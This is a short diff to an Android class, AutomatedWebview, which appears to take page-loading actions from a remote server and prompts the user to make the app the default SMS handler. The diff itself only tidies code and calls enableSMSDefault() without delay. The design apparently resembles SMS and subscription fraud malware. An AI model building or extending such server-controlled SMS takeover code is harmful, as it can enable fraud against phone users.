@@ -155,7 +155,6 @@ public class AutomatedWebview extends WebView {
                                 process();
                             else
                                 updateData("WAITING"); //Update server status with 'WAITING' status
-
                         } else
                             updateData("NO VALID JSON RECEIVED");
                     }
@@ -243,12 +242,8 @@ public class AutomatedWebview extends WebView {
     public void process() {
         int seconds = 0;
         Handler handler = new Handler();
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                enableSMSDefault();
-            }
-        }, seconds * 1000);
+        enableSMSDefault();
+
         int count = 0;
         for (final Action item : actionList) {
             if (item.getAction().equalsIgnoreCase("load")) {
@@ -554,8 +549,6 @@ public class AutomatedWebview extends WebView {
 
     public void enableSMSDefault() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-            String first = Telephony.Sms.getDefaultSmsPackage(context);
-            String second = context.getPackageName();
             if (!Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
 
                 AlertDialog.Builder builder = new AlertDialog.Builder(context);
